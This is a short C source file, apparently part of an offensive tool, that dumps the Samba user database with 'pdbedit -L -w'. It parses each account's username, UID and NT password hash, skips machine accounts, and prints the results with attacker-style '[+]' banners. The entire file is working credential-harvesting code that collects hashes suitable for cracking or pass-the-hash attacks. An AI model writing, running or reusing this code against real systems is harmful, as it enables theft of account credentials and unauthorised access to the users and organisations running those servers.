#include "hash_extract.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAX_HASHES 100

SmbHash* extract_smb_hashes(int *count) {
    FILE *fp = popen("pdbedit -L -w", "r");
    if (!fp) {
        perror("[-] Hash extraction failed");
        return NULL;
    }

    SmbHash *hashes = malloc(MAX_HASHES * sizeof(SmbHash));
    char line[512];
    *count = 0;

    while (fgets(line, sizeof(line), fp) && *count < MAX_HASHES) {
        if (strstr(line, ":$")) continue;

        char *parts[5];
        char *token = strtok(line, ":");
        int i = 0;
        
        while (token && i < 5) {
            parts[i++] = token;
            token = strtok(NULL, ":");
        }

        if (i >= 4) {
            strncpy(hashes[*count].username, parts[0], 255);
            strncpy(hashes[*count].uid, parts[1], 15);
            strncpy(hashes[*count].nt_hash, parts[3], 64);
            (*count)++;
        }
    }

    pclose(fp);
    return hashes;
}

void free_hashes(SmbHash *hashes, int count) {
    free(hashes);
}

void display_hashes(SmbHash *hashes, int count) {
    printf("[+] Retrieved hashes:\n");
    for (int i = 0; i < count; i++) {
        printf("User: %s\n", hashes[i].username);
        printf("  UID: %s\n", hashes[i].uid);
        printf("  NT Hash: %s\n", hashes[i].nt_hash);
        printf("----------------------------------------\n");
    }
}
